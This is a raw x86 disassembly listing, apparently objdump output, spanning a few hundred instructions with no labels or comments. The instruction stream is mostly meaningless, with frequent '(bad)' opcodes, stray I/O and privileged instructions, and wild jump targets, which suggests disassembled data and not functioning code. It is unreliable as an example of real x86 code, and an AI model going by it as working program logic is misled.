  41a052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a053:	adc    al,0x3b
  41a055:	fadd   DWORD PTR [ebx+0x4c]
  41a058:	add    ecx,ecx
  41a05a:	mov    edx,DWORD PTR [eax+eiz*8]
  41a05d:	mov    ecx,0x51177aaf
  41a062:	(bad)  
  41a063:	or     ebp,DWORD PTR [ebx]
  41a065:	test   eax,0x95d706c1
  41a06a:	xchg   ebp,eax
  41a06b:	jg     0x41a0c0
  41a06d:	mov    cl,BYTE PTR [edi-0x4a45cad8]
  41a073:	rol    ebp,1
  41a075:	adc    ecx,esp
  41a077:	jl     0x41a08a
  41a079:	lea    ebx,[esi]
  41a07b:	push   es
  41a07c:	mov    bh,0xc8
  41a07e:	les    eax,FWORD PTR [ebp-0x75]
  41a081:	adc    bh,BYTE PTR [edi-0x4faff3ca]
  41a087:	(bad)  
  41a088:	(bad)  
  41a089:	cmc    
  41a08a:	jg     0x41a073
  41a08c:	stc    
  41a08d:	(bad)  
  41a08e:	jle    0x41a03a
  41a090:	add    cl,BYTE PTR [ebp-0x32d9f3a9]
  41a096:	or     al,0xc3
  41a098:	mov    al,0x41
  41a09a:	sub    edx,DWORD PTR [ebx+0x65031b2b]
  41a0a0:	xchg   esp,eax
  41a0a1:	and    al,0x1e
  41a0a3:	sbb    edi,DWORD PTR [ebx]
  41a0a5:	loopne 0x41a061
  41a0a7:	cmc    
  41a0a8:	lock das 
  41a0aa:	jl     0x41a055
  41a0ac:	loopne 0x41a061
  41a0ae:	mov    dl,BYTE PTR [esi+0x1]
  41a0b1:	cmp    al,0xdd
  41a0b3:	and    eax,0x3e740b3c
  41a0b8:	cmp    al,0xc
  41a0ba:	int    0xf6
  41a0bc:	aaa    
  41a0bd:	mov    eax,0xd0d3c7a
  41a0c2:	cmp    al,0xe
  41a0c4:	je     0x41a13c
  41a0c6:	cmp    al,0xf
  41a0c8:	sub    al,0x84
  41a0ca:	cmp    al,0xb7
  41a0cc:	lods   eax,DWORD PTR ds:[esi]
  41a0cd:	jmp    0x8b48b288
  41a0d2:	imul   ebp,ecx,0x660142e6
  41a0d8:	jg     0x41a0e4
  41a0da:	imul   DWORD PTR [ebp-0x44]
  41a0dd:	dec    eax
  41a0de:	bound  edx,QWORD PTR [eax]
  41a0e0:	mov    edi,0x1c540bca
  41a0e5:	ds jbe 0x41a0ae
  41a0e8:	leave  
  41a0e9:	icebp  
  41a0ea:	pop    es
  41a0eb:	(bad)  
  41a0ec:	ja     0x41a107
  41a0ee:	xor    ecx,DWORD PTR [eax-0x15]
  41a0f1:	outs   dx,BYTE PTR ds:[esi]
  41a0f2:	adc    bl,bl
  41a0f4:	scas   eax,DWORD PTR es:[edi]
  41a0f5:	aam    0x13
  41a0f7:	and    al,0x81
  41a0f9:	xor    eax,0xe3f3a4f4
  41a0fe:	fld    TBYTE PTR [esi+0x6f]
  41a101:	call   DWORD PTR [ebp-0x77]
  41a104:	aad    0x8b
  41a106:	push   esp
  41a107:	or     dl,BYTE PTR cs:0xfd2e5c03
  41a10e:	dec    esp
  41a10f:	rcl    BYTE PTR cs:[edx],1
  41a112:	les    eax,FWORD PTR [ecx+0x1c16fb99]
  41a118:	call   0x1d838c7a
  41a11d:	sbb    edx,edx
  41a11f:	mov    esi,0xfc453b65
  41a124:	adc    eax,0x4422bf0
  41a129:	pop    ecx
  41a12a:	imul   ebx,edi,0x29
  41a12d:	inc    esi
  41a12e:	inc    edx
  41a12f:	sbb    al,0xe
  41a131:	sbb    eax,0xe0755910
  41a136:	in     eax,0x3b
  41a138:	inc    eax
  41a139:	icebp  
  41a13a:	jmp    0x41a147
  41a13c:	(bad)  
  41a13e:	jo     0x41a186
  41a140:	jo     0x41a0fe
  41a142:	or     cl,BYTE PTR [edi+0x1c]
  41a145:	jmp    0xa15aaf93
  41a14a:	inc    ebx
  41a14b:	unpcklps xmm2,XMMWORD PTR [esp+edi*8]
  41a14f:	push   edx
  41a150:	mov    cl,0x4e
  41a152:	mov    eax,DWORD PTR [eax-0x72febe1a]
  41a158:	jl     0x41a162
  41a15a:	fild   DWORD PTR [esi]
  41a15c:	push   cs
  41a15d:	cs pop esi
  41a15f:	outs   dx,DWORD PTR ds:[esi]
  41a160:	cld    
  41a161:	xchg   al,al
  41a163:	push   ecx
  41a164:	add    eax,DWORD PTR [edi+ecx*1]
  41a167:	scas   eax,DWORD PTR es:[edi]
  41a168:	cs lock sub ecx,eax
  41a16c:	jle    0x41a179
  41a16e:	pop    ebp
  41a16f:	add    eax,esi
  41a171:	pop    eax
  41a172:	xchg   esi,eax
  41a173:	inc    edi
  41a174:	test   DWORD PTR [ebx+0x34],ecx
  41a177:	inc    ebp
  41a178:	and    edx,DWORD PTR [edx]
  41a17a:	mov    eax,0x972bf980
  41a17f:	xchg   edi,eax
  41a180:	xchg   edi,eax
  41a181:	mov    bh,0x31
  41a183:	add    al,0xb
  41a185:	je     0x41a1c4
  41a187:	or     al,0x74
  41a189:	dec    ecx
  41a18a:	or     eax,0x740e5574
  41a18f:	xchg   esi,eax
  41a190:	int    0x34
  41a192:	xchg   esp,eax
  41a193:	jo     0x41a1c5
  41a195:	or     BYTE PTR [eax],0x11
  41a198:	mov    BYTE PTR [esi],dl
  41a19a:	bound  esp,QWORD PTR [edi-0x6a976e9a]
  41a1a0:	shl    DWORD PTR [eax],cl
  41a1a2:	std    
  41a1a3:	stos   BYTE PTR es:[edi],al
  41a1a4:	sbb    BYTE PTR [edx+esi*4],dl
  41a1a7:	test   ebx,esp
  41a1a9:	jmp    0x41a228
  41a1ab:	ds enter 0x8793,0x10
  41a1b0:	xor    ebp,DWORD PTR [esp+ebp*2-0x73]
  41a1b4:	aaa    
  41a1b5:	add    al,0xb8
  41a1b7:	adc    BYTE PTR [eax+edx*8-0x6a487b0],bh
  41a1be:	clc    
  41a1bf:	push   esp
  41a1c1:	add    bh,bh
  41a1c3:	je     0x41a152
  41a1c5:	push   ds
  41a1c6:	(bad)  
  41a1c7:	ror    BYTE PTR [esp+edi*8+0x9],1
  41a1cb:	and    edi,DWORD PTR [eax]
  41a1cd:	cmp    BYTE PTR [ecx],dh
  41a1cf:	xchg   ebx,eax
  41a1d0:	xchg   ebp,eax
  41a1d1:	jbe    0x41a184
  41a1d3:	cmp    ebx,DWORD PTR [edi]
  41a1d5:	pop    ss
  41a1d6:	add    dl,BYTE PTR [ecx+0x77]
  41a1d9:	cmp    al,0x1c
  41a1db:	mov    ch,0x93
  41a1dd:	xchg   DWORD PTR [ebp+0x18],ebp
  41a1e0:	and    bl,BYTE PTR [edx+0x42]
  41a1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e4:	adc    DWORD PTR [edi],ebx
  41a1e6:	push   0x10
  41a1e8:	xchg   ecx,eax
  41a1e9:	xchg   DWORD PTR [edx],edx
  41a1eb:	cmp    edi,DWORD PTR [ebx+ebx*8-0x75]
  41a1ef:	jo     0x41a23e
  41a1f1:	outs   dx,DWORD PTR ds:[esi]
  41a1f2:	xor    cl,BYTE PTR [ebp+0xf]
  41a1f5:	test   DWORD PTR [edi*8+0x4babe959],edx
  41a1fc:	and    BYTE PTR [edx+0x6d],0x18
  41a200:	jmp    0x19fe:0xc99e1fe8
  41a207:	and    cl,BYTE PTR [ebx-0x75ebdb94]
  41a20d:	psadbw mm0,QWORD PTR [ebx+0x52]
  41a211:	cmp    DWORD PTR [esp+eiz*8+0x79],esp
  41a215:	popa   
  41a216:	jge    0x41a1a9
  41a218:	pushf  
  41a219:	xchg   BYTE PTR [eax+0x17],bl
  41a21c:	or     ebp,DWORD PTR [esi+edx*1]
  41a21f:	cmc    
  41a220:	lods   eax,DWORD PTR ds:[esi]
  41a221:	jb     0x41a1b3
  41a223:	fisttp QWORD PTR [ebp-0x64]
  41a226:	dec    ebp
  41a227:	jne    0x41a217
  41a229:	push   ss
  41a22a:	cmp    DWORD PTR [ebx],esp
  41a22c:	xor    ebp,DWORD PTR [ebp+eiz*2-0x75]
  41a230:	sbb    eax,0xd37aeb4e
  41a235:	(bad)  
  41a236:	adc    edx,DWORD PTR [eax]
  41a238:	loope  0x41a2a7
  41a23a:	call   0xe2a7b2dd
  41a23f:	dec    edi
  41a240:	cwde   
  41a241:	cmp    DWORD PTR [edx],eax
  41a243:	sbb    al,0x93
  41a245:	outs   dx,DWORD PTR ds:[esi]
  41a246:	sub    eax,0xff087d8e
  41a24b:	ja     0x41a251
  41a24d:	std    
  41a24e:	add    ebx,DWORD PTR [edi]
  41a250:	add    DWORD PTR [eax],esp
  41a252:	jmp    0x78b5:0x886c45eb
  41a259:	pop    ss
  41a25a:	into   
  41a25b:	clc    
  41a25c:	les    eax,FWORD PTR [edi+0x1]
  41a25f:	pusha  
  41a260:	imul   esp,DWORD PTR ds:0x238386e,0xffffff87
  41a267:	add    ebx,DWORD PTR [eiz*8-0x1986d109]
  41a26e:	sub    BYTE PTR [ebp+0x42],ah
  41a271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a272:	adc    al,0x13
  41a274:	xor    BYTE PTR [edi],cl
  41a276:	fisub  WORD PTR [ecx-0x7a]
  41a279:	or     DWORD PTR ds:0x80d6adec,edx
  41a27f:	sbb    al,0xcd
  41a281:	loopne 0x41a213
  41a283:	mov    al,0x11
  41a285:	sub    eax,eax
  41a287:	test   esi,edi
  41a289:	sbb    bh,0x77
  41a28c:	mul    DWORD PTR [esp]
  41a28f:	mov    ecx,eax
  41a291:	jb     0x41a2f7
  41a293:	and    al,0xc
  41a295:	cwde   
  41a296:	pop    edx
  41a297:	jmp    0x41a2ca
  41a299:	pop    ss
  41a29a:	or     DWORD PTR [eax],0xffffffca
  41a29d:	pop    ecx
  41a29e:	pop    ecx
  41a29f:	hlt    
  41a2a0:	sub    al,0x5e
  41a2a2:	je     0x41a2db
  41a2a4:	test   BYTE PTR [ebx+0x4858394a],cl
  41a2aa:	and    DWORD PTR [ebx],0x46
  41a2ad:	mov    cl,0x2d
  41a2af:	outs   dx,BYTE PTR ds:[esi]
  41a2b0:	or     BYTE PTR [ebp+0x17027aeb],bl
  41a2b6:	mov    ds:0x7a34730,eax
  41a2bb:	add    DWORD PTR [ecx-0x1b9c8588],0x53c74d77
  41a2c5:	fild   DWORD PTR [ecx]
  41a2c7:	sub    dl,BYTE PTR [esi+0x29]
  41a2ca:	pop    es
  41a2cb:	call   0x964880fc
  41a2d0:	pusha  
  41a2d1:	mov    ebx,DWORD PTR [eax]
  41a2d3:	stos   DWORD PTR es:[edi],eax
  41a2d4:	sbb    ebp,DWORD PTR [edx+0x7fe0b007]
  41a2da:	div    DWORD PTR [ebp+0x241b82d7]
  41a2e0:	pop    ebx
  41a2e1:	or     BYTE PTR [eax+0x3b],0x29
  41a2e5:	xor    edi,edi
  41a2e7:	cmp    DWORD PTR [ebp-0x18],0xffffffeb
  41a2eb:	pop    edx
  41a2ec:	rcr    BYTE PTR [ebx],0xc0
  41a2ef:	or     eax,0x32936d83
  41a2f4:	cmp    BYTE PTR [eax],cl
  41a2f6:	rcr    BYTE PTR [eax-0x3f],cl
  41a2f9:	aas    
  41a2fa:	clc    
  41a2fb:	movzx  eax,BYTE PTR [eax+0x1]
  41a2ff:	add    DWORD PTR [edi+0x3344b70],eax
  41a305:	gs loopne 0x41a358
  41a308:	push   es
  41a309:	outs   dx,DWORD PTR ds:[esi]
  41a30a:	fmul   QWORD PTR [esi]
  41a30c:	les    ebp,FWORD PTR [esi]
  41a30e:	loopne 0x41a315
  41a310:	ss (bad) 
  41a312:	imul   esi
  41a314:	xchg   DWORD PTR [ebp-0x132df0ff],edi
  41a31a:	mov    esp,0x5f74f03b
  41a31f:	adc    DWORD PTR [esi+0x106d8dd8],0x8
  41a326:	push   ecx
  41a327:	or     BYTE PTR [ebp-0x7d],cl
  41a32a:	cmp    BYTE PTR [edx+0x3c],dh
  41a32d:	fist   WORD PTR [ebx]
  41a32f:	cld    
  41a330:	out    0x7,al
  41a332:	sub    ah,ah
  41a334:	cmp    edi,ebx
  41a336:	jle    0x41a357
  41a338:	iret   
  41a339:	sbb    DWORD PTR [edi],edx
  41a33b:	sar    BYTE PTR [ebx-0x75],0x2f
  41a33f:	inc    ecx
  41a340:	mov    ds:0x3d6af0f,al
  41a345:	adc    edi,ecx
  41a347:	sub    ecx,ebx
  41a349:	pop    DWORD PTR [ecx+eax*4+0x68]
  41a34d:	pop    es
  41a34e:	js     0x41a2dd
  41a350:	and    eax,0x6edd73ba
  41a355:	mov    ebx,DWORD PTR [eax-0x14401bdd]
  41a35b:	arpl   WORD PTR [ebx],bp
  41a35d:	dec    DWORD PTR [eax+0x14]
  41a360:	pop    edx
  41a361:	mov    DWORD PTR [edi-0x76ee5fe5],edi
  41a367:	jge    0x41a359
  41a369:	cmp    ebx,DWORD PTR [ebp-0x10]
  41a36c:	jge    0x41a320
  41a36e:	add    al,0x33
  41a370:	xlat   BYTE PTR ds:[ebx]
  41a371:	or     al,dh
  41a373:	dec    esp
  41a374:	sub    al,0xc7
  41a376:	inc    edi
  41a377:	push   edx
  41a378:	ins    DWORD PTR es:[edi],dx
  41a379:	add    eax,0xc933c01d
  41a37e:	cmp    edi,DWORD PTR [eax+0x6c605013]
  41a384:	mov    al,0xad
  41a386:	push   ss
  41a387:	in     eax,0x12
  41a389:	push   0x82685d4d
  41a38e:	sub    DWORD PTR [ebp+0x2b4da16b],0xffffffce
  41a395:	sbb    ch,al
  41a397:	pop    ebx
  41a398:	and    dl,BYTE PTR [edi-0x49]
  41a39b:	sub    DWORD PTR ss:[esi+0x25],edi
  41a39f:	call   0xfc0438df
  41a3a4:	push   ds
  41a3a5:	sti    
  41a3a6:	or     BYTE PTR ss:[ebx+ebp*4],al
  41a3aa:	sbb    BYTE PTR [eax],cl
  41a3ac:	shr    DWORD PTR [ebx],cl
  41a3ae:	xlat   BYTE PTR ds:[ebx]
  41a3af:	pop    eax
  41a3b0:	mov    BYTE PTR [edi+esi*4],0x60
  41a3b4:	lods   eax,DWORD PTR ds:[esi]
  41a3b5:	inc    esp
  41a3b6:	xchg   ebx,eax
  41a3b7:	cvtps2pd xmm6,QWORD PTR [ebx-0xc]
  41a3bb:	add    esi,ebx
  41a3bd:	aad    0xc2
  41a3bf:	fstp   TBYTE PTR [esi+0x28]
  41a3c2:	pop    ds
  41a3c3:	or     BYTE PTR [edi+edi*8],al
  41a3c6:	imul   ecx,DWORD PTR [ebx+0x32],0x1c
  41a3ca:	inc    ebx
  41a3cb:	xor    esi,esi
  41a3cd:	mov    al,0xd6
  41a3cf:	jbe    0x41a380
  41a3d1:	xchg   edx,eax
  41a3d2:	aaa    
  41a3d3:	lea    eax,[edx+ecx*2]
  41a3d6:	adc    al,0xcb
  41a3d8:	shl    DWORD PTR [edx],1
  41a3da:	ins    BYTE PTR es:[edi],dx
  41a3db:	je     0x41a365
  41a3dd:	inc    esi
  41a3de:	daa    
  41a3df:	out    0x6a,eax
  41a3e1:	dec    edi
  41a3e2:	test   DWORD PTR [edi],edi
  41a3e4:	bound  eax,QWORD PTR [ebx-0x3d]
  41a3e7:	mov    esp,ebp
  41a3e9:	rcl    BYTE PTR gs:[ebx+eax*4-0x15],0x78
  41a3ef:	or     BYTE PTR [edx],cl
  41a3f1:	mov    cl,0x4
  41a3f3:	and    bh,dl
  41a3f5:	dec    edi
  41a3f6:	xor    eax,DWORD PTR [ebx+ecx*8]
  41a3f9:	inc    edx
  41a3fa:	mov    bl,0xf
  41a3fc:	push   esi
  41a3fd:	dec    ecx
  41a3fe:	daa    
  41a3ff:	pop    esi
  41a400:	xchg   esp,eax
  41a401:	dec    esi
  41a402:	sub    dl,BYTE PTR [edi+0x7a]
  41a405:	push   esp
  41a406:	xchg   esi,eax
  41a407:	sub    ecx,DWORD PTR [ebx+0x7e2e7560]
  41a40d:	and    al,BYTE PTR [edi]
  41a40f:	lds    edi,FWORD PTR [edx-0x7f997c52]
  41a415:	xchg   DWORD PTR es:[eax],ebx
  41a418:	and    BYTE PTR [edx+0x6b],ah
  41a41b:	call   0x14ac5420
  41a420:	pop    es
  41a421:	dec    ebx
  41a422:	js     0x41a3a5
  41a424:	push   ss
  41a425:	and    eax,0xff185498
  41a42a:	inc    ebx
  41a42b:	clc    
  41a42c:	xor    al,dl
  41a42e:	sbb    al,ch
  41a430:	pop    ss
  41a431:	mov    ds:0x2cf4e377,eax
  41a436:	dec    esi
  41a437:	in     al,dx
  41a438:	sbb    BYTE PTR [edx+0x1c],ch
  41a43b:	shr    BYTE PTR [esp+eax*2],cl
  41a43e:	sub    DWORD PTR [ecx-0x28bcd139],0x7e067504
  41a448:	sbb    cl,BYTE PTR [ebx]
  41a44a:	js     0x41a469
  41a44c:	push   esp
  41a44d:	jle    0x41a46b
  41a44f:	dec    edi
  41a450:	mov    bl,0x8d
  41a452:	push   0xfef87281
  41a457:	or     eax,0x13a93f7b
  41a45c:	mov    esp,0xee812b80
  41a461:	mov    ds:0x4463ea9b,eax
  41a466:	dec    ah
  41a468:	mov    eax,esp
  41a46a:	mov    dl,0x2d
  41a46c:	ds pusha 
  41a46e:	jne    0x41a3f6
  41a470:	push   0x15
  41a472:	push   esp
  41a473:	push   0x42
  41a475:	inc    ebx
  41a476:	jb     0x41a453
  41a478:	mov    dh,0x44
  41a47a:	out    0x10,eax
  41a47c:	add    eax,0x2e083b10
  41a481:	and    BYTE PTR ds:0x515f2b3a,0x22
  41a488:	hlt    
  41a489:	inc    edi
  41a48a:	icebp  
  41a48b:	mov    eax,ds:0xaf302668
  41a490:	je     0x41a4bd
  41a492:	add    eax,0x99fcfca
  41a497:	(bad)  
  41a498:	push   es
  41a499:	or     BYTE PTR [edi+eax*1+0xc],dh
  41a49d:	jne    0x41a4aa
  41a49f:	xchg   ecx,eax
  41a4a0:	mov    ds:0x54a6f68d,al
  41a4a5:	dec    esi
  41a4a6:	or     eax,0xc0583605
  41a4ab:	add    al,0xef
  41a4ad:	mov    ebp,0x8a5af7fb
  41a4b2:	fimul  WORD PTR [esi+0x28]
  41a4b5:	sqrtps xmm1,XMMWORD PTR [ebx-0x73]
  41a4b9:	jne    0x41a4b7
  41a4bb:	mov    dh,BYTE PTR [ecx-0x37d9aaee]
  41a4c1:	add    DWORD PTR [ecx+ebp*4+0x413b012f],0x50b188a
  41a4cc:	cmp    bl,0x5c
  41a4cf:	xchg   BYTE PTR [ebp+0x16],ch
  41a4d2:	aam    0x5a
  41a4d4:	or     al,0x28
  41a4d6:	mov    edi,0x31922080
  41a4db:	stos   DWORD PTR es:[edi],eax
  41a4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4dd:	scas   al,BYTE PTR es:[edi]
  41a4de:	inc    DWORD PTR [edx]
  41a4e0:	mov    esi,0xa6add05b
  41a4e5:	ds inc eax
  41a4e7:	cmp    ah,dl
  41a4e9:	cmp    BYTE PTR [esi+0x4419fbe0],bl
  41a4ef:	movmskps esi,xmm2
  41a4f2:	fmul   QWORD PTR [ecx-0x57]
  41a4f5:	mov    edx,0x30a36367
  41a4fa:	out    0x85,eax
  41a4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4fd:	cmp    eax,0xed88450
  41a502:	push   ebx
  41a503:	mov    eax,ds:0xa27eafff
  41a508:	clc    
  41a509:	push   eax
  41a50a:	adc    eax,0x8704dbb
  41a50f:	cmp    al,ah
  41a511:	xor    BYTE PTR ds:0x6dce3880,cl
  41a518:	std    
  41a519:	ins    DWORD PTR es:[edi],dx
  41a51a:	jnp    0x41a55d
  41a51c:	pop    es
  41a51d:	js     0x41a520
  41a51f:	pop    esp
  41a520:	out    0x27,al
  41a522:	aas    
  41a523:	or     al,0x18
  41a525:	les    ebp,FWORD PTR [edi]
  41a527:	sbb    ah,BYTE PTR [edi-0x2b]
  41a52a:	cmp    al,0x5c
  41a52c:	shl    BYTE PTR [edx+0x22b44d63],0xd
  41a533:	or     eax,0x1740f019
  41a538:	jecxz  0x41a507
  41a53a:	push   ds
  41a53b:	cmp    ch,dh
  41a53d:	cmp    BYTE PTR [ecx],cl
  41a53f:	xor    edx,DWORD PTR [esi]
  41a541:	leave  
  41a542:	xchg   edi,eax
  41a543:	int    0x62
  41a545:	jg     0x41a572
  41a547:	pop    ebp
  41a548:	cld    
  41a549:	lea    eax,[ebx+0x1]
  41a54c:	imul   esi,DWORD PTR [eax+esi*2+0x10],0x65a6e350
  41a554:	inc    ecx
  41a555:	imul   edi,DWORD PTR [ebp-0x14],0x2b
  41a559:	call   FWORD PTR [ecx+0x28]
  41a55c:	fcomp  QWORD PTR [ebx]
  41a55e:	add    eax,0xb73d40c3
  41a563:	shr    BYTE PTR [ecx+0x71ecdacd],1
  41a569:	inc    edi
  41a56a:	push   edi
  41a56b:	lock cmp BYTE PTR [ecx],bl
  41a56e:	cmp    ah,BYTE PTR [ebp+0x21]
  41a571:	cdq    
  41a572:	mov    ecx,0x4dfeaa46
  41a577:	add    esp,DWORD PTR [edi+ebp*8-0x7c489c94]
  41a57e:	adc    dh,BYTE PTR [ebx+edi*2-0x1]
  41a582:	pushf  
  41a583:	pop    ds
  41a584:	(bad)  
  41a585:	sub    edi,ebp
  41a587:	(bad)  
  41a588:	ins    BYTE PTR es:[edi],dx
  41a589:	jmp    0x41a597
  41a58b:	lea    edx,[ebx-0x25]
  41a58e:	ret    0x7f50
  41a591:	pop    esp
  41a592:	mov    BYTE PTR [ebp+ebx*1+0x26b85c32],0x9b
  41a59a:	fucom  st(2)
  41a59c:	push   cs
  41a59d:	mov    DWORD PTR [eax+0x50],ecx
  41a5a0:	sub    DWORD PTR [esi+0x40],ebx
  41a5a3:	dec    ebp
  41a5a4:	les    esp,FWORD PTR [ebp-0x3d]
  41a5a7:	pop    edi
  41a5a8:	aas    
  41a5a9:	inc    eax
  41a5aa:	test   esp,ebp
  41a5ac:	xor    al,0xe8
  41a5af:	gs loopne 0x41a537
  41a5b2:	dec    ecx
  41a5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5b4:	inc    eax
  41a5b5:	or     BYTE PTR [ecx+0x25],0x22
  41a5b9:	fisttp WORD PTR [ecx]
  41a5bb:	(bad)  
  41a5bc:	out    dx,eax
  41a5bd:	call   DWORD PTR [edi+0x72656bc8]
  41a5c3:	outs   dx,BYTE PTR ds:[esi]
  41a5c4:	gs ins BYTE PTR es:[edi],dx
  41a5c6:	xor    esi,DWORD PTR [edx]
  41a5c8:	cs fs ins BYTE PTR es:[edi],dx
  41a5cb:	ins    BYTE PTR es:[edi],dx
  41a5cc:	add    ah,al
  41a5ce:	gs je  0x41a61d
  41a5d1:	outs   dx,DWORD PTR ds:[esi]
  41a5d2:	outs   dx,BYTE PTR ds:[esi]
  41a5d3:	addr16 push eax
  41a5d5:	popa   
  41a5d6:	pusha  
  41a5d7:	mov    ?,eax
  41a5d9:	(bad)  
  41a5da:	je     0x41a644
  41a5dc:	dec    esi
  41a5dd:	popa   
  41a5de:	ins    DWORD PTR es:[edi],dx
  41a5df:	gs inc ecx
  41a5e1:	adc    edx,edi
  41a5e3:	fdiv   st(6),st
  41a5e5:	sbb    cl,dh
  41a5e7:	push   es
  41a5e8:	rcl    edx,0xa8
  41a5eb:	fbstp  TBYTE PTR [esi+0x56]
  41a5ee:	add    BYTE PTR [esi-0x393304a3],dh
  41a5f4:	inc    ebp
  41a5f5:	out    dx,al
  41a5f6:	adc    DWORD PTR [edi+0x68],esp
  41a5f9:	sbb    DWORD PTR [eax+eax*1+0x59],esi
  41a5fd:	stos   DWORD PTR es:[edi],eax
  41a5fe:	and    al,0x7f
  41a600:	xchg   edx,eax
  41a601:	inc    eax
  41a602:	test   al,0x68
  41a604:	add    DWORD PTR [ecx+0x1d],ecx
  41a607:	or     al,0xd9
  41a609:	or     BYTE PTR [edx+eax*1+0x22],0x3b
  41a60e:	les    eax,FWORD PTR [eax]
  41a610:	les    esp,FWORD PTR [eax+0x1f670481]
  41a616:	inc    ecx
  41a617:	mov    ss,edx
  41a619:	aas    
  41a61a:	push   0xba84fcfe
  41a61f:	add    eax,0x8f787b60
  41a624:	cwde   
  41a625:	mov    BYTE PTR [esi-0x18],al
  41a628:	loop   0x41a5f3
  41a62a:	test   DWORD PTR [edx-0x25f1163],0x60772c66
  41a634:	fbstp  TBYTE PTR [edx+0x1de4671f]
  41a63a:	add    al,0xc4
  41a63c:	mov    bl,0x97
  41a63e:	push   esp
  41a63f:	mov    bh,0x3
  41a641:	repnz add al,bl
  41a644:	aas    
  41a645:	outs   dx,DWORD PTR ds:[esi]
  41a646:	and    DWORD PTR [ecx],ebx
  41a648:	mov    cl,0x65
  41a64a:	add    BYTE PTR [esi],cl
  41a64c:	std    
  41a64d:	pop    ds
  41a64e:	mov    bl,0xb0
  41a650:	cmp    eax,0x6afedfe4
  41a655:	add    eax,0x30cf356
  41a65a:	clc    
  41a65b:	outs   dx,BYTE PTR ds:[esi]
  41a65c:	xor    al,0xc2
  41a65e:	in     al,dx
  41a65f:	in     al,0xc4
  41a661:	dec    esi
  41a662:	cmp    BYTE PTR [ebp+0x2db70020],0x7d
  41a669:	xchg   esi,eax
  41a66a:	aaa    
  41a66b:	stc    
  41a66c:	jge    0x41a661
  41a66e:	push   esp
  41a66f:	or     al,BYTE PTR ds:0xd780fee
  41a675:	retf   
  41a676:	dec    esp
  41a677:	jmp    0xbd79cb9
  41a67c:	shl    BYTE PTR [ebp-0x6506afca],1
  41a682:	jmp    0x41a687
  41a684:	int    0x95
  41a686:	in     al,0x44
  41a688:	cmp    ebp,DWORD PTR [ebx-0x4c]
  41a68b:	mov    ebp,0x3b23dc2e
  41a690:	or     eax,0xac9508dc
  41a695:	add    al,0xa
  41a697:	jb     0x41a698
  41a699:	and    eax,ebx
  41a69b:	sbb    DWORD PTR [edi],edi
  41a69d:	loopne 0x41a6e9
  41a69f:	jae    0x41a685
  41a6a1:	sub    edx,eax
  41a6a3:	and    edx,eax
  41a6a5:	fisubr DWORD PTR [edi]
  41a6a7:	or     DWORD PTR [ebx+0x2923bb9],eax
  41a6ad:	add    ecx,DWORD PTR [edi-0x54081327]
  41a6b3:	hlt    
  41a6b4:	and    al,0x75
  41a6b6:	jb     0x41a63e
  41a6b8:	je     0x41a726
  41a6ba:	pop    ss
  41a6bb:	cmp    ebp,DWORD PTR [ecx-0xcf36bd0]
  41a6c1:	sbb    ebp,DWORD PTR ss:[edi]
  41a6c4:	push   ecx
  41a6c5:	stos   BYTE PTR es:[edi],al
  41a6c6:	push   ebp
  41a6c7:	pop    eax
  41a6c8:	cmp    DWORD PTR [esp+ecx*1+0x679ff809],ebx
  41a6cf:	push   ebx
  41a6d0:	outs   dx,DWORD PTR ds:[esi]
  41a6d1:	data16 je 0x41a74b
  41a6d4:	popa   
  41a6d5:	jb     0x41a73c
  41a6d7:	daa    
  41a6d8:	ror    dl,0xdc
  41a6db:	outs   dx,DWORD PTR ds:[esi]
  41a6dc:	arpl   WORD PTR gs:[ecx+0x6c],sp
  41a6e0:	gs jae 0x41a6b1
  41a6e3:	sbb    edi,eax
  41a6e5:	adc    BYTE PTR [eax-0x1eddbcb7],dh
  41a6eb:	inc    eax
  41a6ec:	hlt    
  41a6ed:	mov    esp,0x6b93d523
  41a6f2:	inc    ecx
  41a6f3:	adc    al,0xff
  41a6f5:	mov    eax,0x78831708
  41a6fa:	call   0x3534b803
  41a6ff:	hlt    
  41a700:	inc    ecx
  41a701:	mov    bl,0xde
  41a703:	push   esi
  41a704:	fisub  WORD PTR [ebx-0x287700f7]
  41a70a:	push   eax
  41a70b:	xor    eax,0xa159f07c
  41a710:	adc    esi,DWORD PTR [ecx]
  41a712:	test   al,0x52
  41a714:	xchg   ebx,eax
  41a715:	je     0x41a71a
  41a717:	std    
  41a718:	ficomp WORD PTR [eax+0x2b]
  41a71b:	idiv   BYTE PTR [ebx]
  41a71d:	(bad)  
  41a71e:	jne    0x41a73b
  41a720:	pop    ss
  41a721:	repnz xor bh,BYTE PTR [edx+0x23b9514c]
  41a728:	loopne 0x41a744
  41a72a:	fsubr  st,st(3)
  41a72c:	inc    eax
  41a72d:	or     DWORD PTR [ebp-0x7a490ec8],ebp
  41a733:	aas    
  41a734:	cs mov eax,DWORD PTR ss:[edi]
  41a738:	mov    ecx,0x88e516bf
  41a73d:	mov    esi,0xac1c3343
  41a742:	sahf   
  41a743:	fdivr  DWORD PTR [ebx+0x1701bbb0]
  41a749:	mov    DWORD PTR [edx],eax
  41a74b:	xor    al,0xb
  41a74d:	sbb    BYTE PTR ds:0xc5a07006,dh
  41a753:	jne    0x41a795
  41a755:	cmp    al,0x9f
  41a757:	and    al,0x9a
  41a759:	cdq    
  41a75a:	push   es
  41a75b:	cmp    al,BYTE PTR [edi+0x3c9ad0bd]
  41a761:	jecxz  0x41a79c
  41a763:	rol    DWORD PTR [ecx-0x25],cl
  41a766:	jge    0x41a7ab
  41a768:	mov    ds:0x61710725,al
  41a76d:	add    al,0x5d
  41a76f:	iret   
  41a770:	fsub   QWORD PTR [ebx-0x70]
  41a773:	or     ah,BYTE PTR [edi]
  41a775:	test   al,0x59
  41a777:	cmp    BYTE PTR [ebp-0x39],dh
  41a77a:	xchg   ebp,eax
  41a77b:	mov    cl,0x61
  41a77d:	add    BYTE PTR [ebx-0xa],bl
  41a780:	xor    BYTE PTR [edi-0x3f08ccbc],al
  41a786:	xor    BYTE PTR [edi],cl
  41a788:	imul   ecx,ebp,0x42
  41a78b:	mov    BYTE PTR [ebx+0x57859173],0xf0
  41a792:	cmp    BYTE PTR [esp+ebx*8+0x5a99dbe8],bl
  41a799:	popw   ss
  41a79b:	cmp    eax,DWORD PTR ds:0x36f9753a
